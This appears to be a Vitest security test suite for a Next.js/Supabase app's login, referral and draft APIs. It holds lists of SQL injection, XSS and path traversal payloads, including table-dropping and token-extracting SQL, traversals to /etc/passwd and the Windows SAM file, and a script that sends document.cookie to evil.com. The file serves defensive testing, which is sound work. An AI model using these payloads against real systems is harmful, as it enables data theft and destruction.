/**
 * Security Tests: SQL Injection, XSS, Header Injection, Path Traversal
 *
 * Tests that all user input is properly handled and cannot lead to:
 * - SQL injection via Supabase query parameters
 * - XSS via reflected input in responses
 * - Header injection via user-controlled values
 * - Path traversal via filenames or IDs
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { NextRequest, NextResponse } from 'next/server';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

const mockSignInWithPassword = vi.fn();
const mockGetUser = vi.fn();
const mockGetSession = vi.fn();
const mockSupabaseFrom = vi.fn();

const mockSupabaseClient = {
  auth: {
    signInWithPassword: mockSignInWithPassword,
    getUser: mockGetUser,
    getSession: mockGetSession,
  },
  from: mockSupabaseFrom,
};

vi.mock('@/lib/server/supabaseServer', () => ({
  createClient: vi.fn(async () => mockSupabaseClient),
}));

const mockServiceRpc = vi.fn();
const mockServiceFrom = vi.fn();

vi.mock('@/lib/server/supabaseService', () => ({
  getServiceSupabase: vi.fn(() => ({
    rpc: mockServiceRpc,
    from: mockServiceFrom,
    auth: {
      signUp: vi.fn(),
      resetPasswordForEmail: vi.fn(),
      admin: { deleteUser: vi.fn() },
    },
    storage: { from: vi.fn() },
  })),
}));

const mockAuthenticateRequest = vi.fn();
vi.mock('@/lib/server/auth', () => ({
  authenticateRequest: (...args: unknown[]) => mockAuthenticateRequest(...args),
}));

const mockCheckRateLimit = vi.fn();
const mockLogApiCall = vi.fn();
vi.mock('@/lib/server/rateLimiting', () => ({
  checkRateLimit: (...args: unknown[]) => mockCheckRateLimit(...args),
  logApiCall: (...args: unknown[]) => mockLogApiCall(...args),
  rateLimitExceededResponse: vi.fn(() =>
    NextResponse.json({ error: 'Rate limit exceeded' }, { status: 429 })
  ),
  addRateLimitHeaders: vi.fn(),
}));

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function createRequest(
  url: string,
  options?: { method?: string; body?: unknown; headers?: Record<string, string> },
): NextRequest {
  return new NextRequest(`http://localhost:3000${url}`, {
    method: options?.method ?? 'GET',
    headers: { 'Content-Type': 'application/json', ...(options?.headers ?? {}) },
    ...(options?.body !== undefined ? { body: JSON.stringify(options.body) } : {}),
  });
}

function authSuccess(userId = 'user-123') {
  const supabaseMock = {
    from: vi.fn().mockReturnThis(),
    select: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    order: vi.fn().mockReturnThis(),
    limit: vi.fn().mockReturnThis(),
    maybeSingle: vi.fn().mockResolvedValue({ data: null, error: null }),
    single: vi.fn().mockResolvedValue({ data: null, error: null }),
    insert: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    upsert: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    rpc: vi.fn().mockResolvedValue({ data: null, error: null }),
    storage: {
      from: vi.fn().mockReturnValue({
        upload: vi.fn().mockResolvedValue({ error: null }),
      }),
    },
  };
  mockAuthenticateRequest.mockResolvedValue({
    user: { id: userId, email: `${userId}@test.com` },
    supabase: supabaseMock,
    error: null,
  });
  return supabaseMock;
}

function rateLimitAllow() {
  mockCheckRateLimit.mockResolvedValue({
    data: { allowed: true, hourly_remaining: 100, daily_remaining: 1000 },
    error: null,
  });
}

// Common SQL injection payloads
const SQL_INJECTIONS = [
  "'; DROP TABLE student; --",
  "1' OR '1'='1",
  "1; SELECT * FROM auth.users; --",
  "' UNION SELECT token FROM api_tokens; --",
  "admin'--",
  "1' AND 1=CAST((SELECT token FROM api_tokens LIMIT 1) AS int)--",
  "\\'; DROP TABLE company_offer; --",
];

// Common XSS payloads
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
  "javascript:alert('XSS')",
  '<svg onload=alert(1)>',
  '{{constructor.constructor("return this")().alert(1)}}',
];

// Path traversal payloads
const PATH_TRAVERSALS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
];

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Security: Injection Attacks', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    rateLimitAllow();
  });

  // =========================================================================
  // 1. SQL Injection via login
  // =========================================================================
  describe('SQL injection in login fields', () => {
    for (const payload of SQL_INJECTIONS) {
      it(`rejects SQL injection in email: ${payload.slice(0, 40)}...`, async () => {
        const { POST } = await import('@/app/api/auth/login/route');
        const req = createRequest('/api/auth/login', {
          method: 'POST',
          body: { email: payload, password: 'test12345' },
        });
        const res = await POST(req);
        // Should be rejected by Zod validation (invalid email format)
        expect(res.status).toBe(400);
      });
    }

    it('SQL injection in password field does not cause server error', async () => {
      mockSignInWithPassword.mockResolvedValue({
        data: { user: null, session: null },
        error: { message: 'Invalid credentials' },
      });

      const { POST } = await import('@/app/api/auth/login/route');
      const req = createRequest('/api/auth/login', {
        method: 'POST',
        body: { email: 'user@test.com', password: "'; DROP TABLE auth.users; --" },
      });
      const res = await POST(req);
      // Should either be validation error or auth error, NOT 500
      expect(res.status).not.toBe(500);
    });
  });

  // =========================================================================
  // 2. SQL Injection in GPT4 token field
  // =========================================================================
  describe('SQL injection in GPT4 token', () => {
    for (const payload of SQL_INJECTIONS) {
      it(`handles SQL injection in token: ${payload.slice(0, 40)}...`, async () => {
        mockServiceFrom.mockReturnValue({
          select: vi.fn().mockReturnThis(),
          eq: vi.fn().mockReturnThis(),
          maybeSingle: vi.fn().mockResolvedValue({ data: null, error: null }),
        });

        const { POST } = await import('@/app/api/autoapply/gpt4/route');
        const req = createRequest('/api/autoapply/gpt4', {
          method: 'POST',
          body: { token: payload, messages: [{ role: 'user', content: 'hi' }] },
        });
        const res = await POST(req);
        // Should return 401, not 500
        expect(res.status).toBe(401);
      });
    }
  });

  // =========================================================================
  // 3. SQL Injection in referral code
  // =========================================================================
  describe('SQL injection in referral code', () => {
    it('rejects SQL injection payloads via format validation', async () => {
      authSuccess();

      const { POST } = await import('@/app/api/student/referral/apply/route');

      for (const payload of SQL_INJECTIONS) {
        const req = createRequest('/api/student/referral/apply', {
          method: 'POST',
          body: { code: payload },
        });
        const res = await POST(req);
        // Referral code must be 8 alphanumeric chars — injection payloads fail format check
        expect(res.status).toBe(400);
      }
    });
  });

  // =========================================================================
  // 4. XSS in feedback / profile fields
  // =========================================================================
  describe('XSS payloads in input fields', () => {
    it('login error response does not reflect XSS payloads', async () => {
      const { POST } = await import('@/app/api/auth/login/route');

      for (const payload of XSS_PAYLOADS) {
        const req = createRequest('/api/auth/login', {
          method: 'POST',
          body: { email: payload, password: 'test' },
        });
        const res = await POST(req);
        const body = await res.json();
        const bodyStr = JSON.stringify(body);
        // Response should not reflect the XSS payload back
        expect(bodyStr).not.toContain('<script>');
        expect(bodyStr).not.toContain('onerror=');
        expect(bodyStr).not.toContain('onload=');
      }
    });

    it('profile draft update handles XSS in field values without error', async () => {
      const supabase = authSuccess();
      supabase.from.mockReturnValue(supabase);
      supabase.update.mockReturnValue(supabase);
      supabase.eq.mockReturnValue(supabase);
      supabase.select.mockReturnValue(supabase);
      supabase.single.mockResolvedValue({
        data: { id: 'draft-1', student_name: '<script>alert(1)</script>' },
        error: null,
      });

      const { PUT } = await import('@/app/api/student/profile/draft/route');
      const req = createRequest('/api/student/profile/draft', {
        method: 'PUT',
        body: {
          draftId: 'draft-1',
          updates: { student_name: '<script>alert("XSS")</script>' },
        },
      });
      const res = await PUT(req);
      // Should succeed (storage is the responsibility of the rendering layer)
      // but critically should NOT cause a server error
      expect(res.status).not.toBe(500);
    });
  });

  // =========================================================================
  // 5. Path traversal in UUID parameters
  // =========================================================================
  describe('Path traversal in UUID parameters', () => {
    beforeEach(() => {
      authSuccess();
    });

    it('rejects path traversal in company draft ID', async () => {
      const { GET } = await import('@/app/api/company/offer/draft/[id]/route');

      for (const payload of PATH_TRAVERSALS) {
        const req = createRequest(`/api/company/offer/draft/${payload}`);
        const res = await GET(req, { params: Promise.resolve({ id: payload }) });
        // UUID regex validation should reject path traversal
        expect(res.status).toBe(400);
        const body = await res.json();
        expect(body.error).toBe('Invalid ID format');
      }
    });

    it('rejects path traversal in company offer delete ID', async () => {
      const { DELETE } = await import('@/app/api/company/offer/[id]/route');

      for (const payload of PATH_TRAVERSALS) {
        const req = createRequest(`/api/company/offer/${payload}`, { method: 'DELETE' });
        const res = await DELETE(req, { params: Promise.resolve({ id: payload }) });
        expect(res.status).toBe(400);
      }
    });

    it('rejects non-UUID strings in finalize draftId', async () => {
      const supabase = authSuccess();
      // Set up from chain for finalize
      supabase.from.mockReturnValue(supabase);
      supabase.select.mockReturnValue(supabase);
      supabase.eq.mockReturnValue(supabase);
      supabase.single.mockResolvedValue({ data: null, error: null });

      const { POST } = await import('@/app/api/student/profile/draft/finalize/route');
      const req = createRequest('/api/student/profile/draft/finalize', {
        method: 'POST',
        body: { draftId: '../../../etc/passwd' },
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toBe('Invalid ID format');
    });
  });

  // =========================================================================
  // 6. Header injection attempts
  // =========================================================================
  describe('Header injection attempts', () => {
    it('signup does not reflect x-forwarded-for header value in response body', async () => {
      mockServiceRpc.mockResolvedValue({ data: 0, error: null });
      mockServiceFrom.mockReturnValue({
        insert: vi.fn().mockResolvedValue({ data: null, error: null }),
      });

      // Mock a successful signup
      vi.mocked(
        (await import('@/lib/server/supabaseService')).getServiceSupabase
      ).mockReturnValue({
        auth: {
          signUp: vi.fn().mockResolvedValue({
            data: { user: { id: 'u1' }, session: null },
            error: null,
          }),
          resetPasswordForEmail: vi.fn(),
          admin: { deleteUser: vi.fn() },
        },
        rpc: vi.fn().mockResolvedValue({ data: 0, error: null }),
        from: vi.fn().mockReturnValue({
          insert: vi.fn().mockResolvedValue({ data: null, error: null }),
        }),
        storage: { from: vi.fn() },
      } as never);

      const { POST } = await import('@/app/api/auth/signup/route');
      // Use a suspicious but valid header value (no CRLF, since runtime rejects those)
      const req = createRequest('/api/auth/signup', {
        method: 'POST',
        body: { email: 'user@test.com', password: 'StrongPass123!', role: 'student' },
        headers: {
          'x-forwarded-for': '1.2.3.4; X-Injected=true',
        },
      });
      const res = await POST(req);
      const body = await res.json();
      const bodyStr = JSON.stringify(body);
      // Response should not reflect the injected header content
      expect(bodyStr).not.toContain('X-Injected');
    });

    it('CRLF characters in headers are rejected by runtime (defense in depth)', () => {
      // The runtime (NextRequest) rejects headers with CRLF — this is defense in depth
      expect(() => {
        new NextRequest('http://localhost:3000/api/test', {
          method: 'GET',
          headers: { 'x-forwarded-for': 'evil\r\nX-Injected: true' },
        });
      }).toThrow();
    });
  });

  // =========================================================================
  // 7. Null byte injection
  // =========================================================================
  describe('Null byte injection', () => {
    it('handles null bytes in login email gracefully', async () => {
      const { POST } = await import('@/app/api/auth/login/route');
      const req = createRequest('/api/auth/login', {
        method: 'POST',
        body: { email: 'user@test.com\0admin@test.com', password: 'test12345' },
      });
      const res = await POST(req);
      // Should be rejected by validation (invalid email) or handled safely
      expect(res.status).not.toBe(500);
    });

    it('handles null bytes in draft ID gracefully', async () => {
      authSuccess();
      const { GET } = await import('@/app/api/company/offer/draft/[id]/route');
      const req = createRequest('/api/company/offer/draft/test');
      const res = await GET(req, {
        params: Promise.resolve({ id: '11111111-1111-1111-1111-111111111111\0injected' }),
      });
      // UUID regex should reject this
      expect(res.status).toBe(400);
    });
  });

  // =========================================================================
  // 8. Unicode normalization attacks
  // =========================================================================
  describe('Unicode normalization attacks', () => {
    it('handles unicode in email field', async () => {
      const { POST } = await import('@/app/api/auth/login/route');
      // Homograph attack: using unicode lookalike characters
      const req = createRequest('/api/auth/login', {
        method: 'POST',
        body: { email: 'аdmin@test.com', password: 'test12345' }, // 'а' is Cyrillic
      });
      const res = await POST(req);
      // Zod validation or Supabase will handle this — must not cause 500
      expect(res.status).not.toBe(500);
    });

    it('handles unicode in referral code', async () => {
      authSuccess();
      const { POST } = await import('@/app/api/student/referral/apply/route');
      const req = createRequest('/api/student/referral/apply', {
        method: 'POST',
        body: { code: 'аbcd1234' }, // 'а' is Cyrillic — not alphanumeric ASCII
      });
      const res = await POST(req);
      // Regex /^[a-z0-9]{8}$/ should reject Cyrillic
      expect(res.status).toBe(400);
    });
  });

  // =========================================================================
  // 9. Prototype pollution via JSON
  // =========================================================================
  describe('Prototype pollution via JSON body', () => {
    it('draft update ignores __proto__ in updates', async () => {
      const supabase = authSuccess();
      supabase.from.mockReturnValue(supabase);
      supabase.update.mockReturnValue(supabase);
      supabase.eq.mockReturnValue(supabase);
      supabase.select.mockReturnValue(supabase);
      supabase.single.mockResolvedValue({
        data: { id: 'draft-1' },
        error: null,
      });

      const { PUT } = await import('@/app/api/student/profile/draft/route');
      const req = createRequest('/api/student/profile/draft', {
        method: 'PUT',
        body: {
          draftId: 'draft-1',
          updates: {
            student_name: 'Normal Name',
            '__proto__': { admin: true },
            'constructor': { prototype: { isAdmin: true } },
          },
        },
      });
      const res = await PUT(req);
      // __proto__ and constructor should be stripped by ALLOWED_DRAFT_FIELDS whitelist
      expect(res.status).not.toBe(500);
    });

    it('company draft update ignores __proto__ in updates', async () => {
      const supabase = authSuccess();
      supabase.from.mockReturnValue(supabase);
      supabase.update.mockReturnValue(supabase);
      supabase.eq.mockReturnValue(supabase);
      supabase.select.mockReturnValue(supabase);
      supabase.maybeSingle.mockResolvedValue({
        data: { id: 'draft-1' },
        error: null,
      });

      const { PUT } = await import('@/app/api/company/offer/draft/[id]/route');
      const req = createRequest('/api/company/offer/draft/11111111-1111-1111-1111-111111111111', {
        method: 'PUT',
        body: {
          basic_info: { title: 'Test' },
          '__proto__': { admin: true },
          'constructor': { prototype: { isAdmin: true } },
        },
      });
      const res = await PUT(req, {
        params: Promise.resolve({ id: '11111111-1111-1111-1111-111111111111' }),
      });
      // __proto__ should be filtered by ALLOWED_DRAFT_FIELDS
      expect(res.status).not.toBe(500);
    });
  });
});
